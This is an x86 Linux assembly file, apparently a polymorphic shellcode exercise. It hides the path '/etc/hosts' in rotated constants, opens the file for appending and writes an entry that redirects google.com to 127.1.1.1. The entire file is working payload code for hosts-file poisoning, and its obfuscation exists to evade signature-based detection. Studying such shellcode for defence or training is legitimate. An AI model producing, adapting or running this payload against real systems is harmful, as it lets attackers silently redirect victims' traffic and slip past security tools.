; polymoprhic_hosts.asm
; Author: German Namestnikov

global _start

section .text

_start:
    xor ecx, ecx
    xor eax, eax       

    add al, 0x05         
    
    push ecx             
    inc ecx

    mov edx, 0xe6e8e6de  


    ror edx, cl
    push edx

    mov edx, 0xd05e5e5e
    ror edx, cl
    push edx

    mov edx, 0xc6e8ca5e
    ror edx, cl
    push edx
   
    mov ebx, esp

    mov ch, 0x04        
    mov cl, 0x01
    int 0x80            

    xor ebx, ebx
    xchg eax, ebx

    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
 
    xor edx, edx
    mov dl, 0x14
    mov al, 0x04

    int 0x80        ;syscall to write in the file

    mov al, 0x06
    int 0x80        ;syscall to close the file

    mov al, 0x01
    int 0x80        ;syscall to exit


_load_data:
    call _write
    google db "127.1.1.1 google.com"
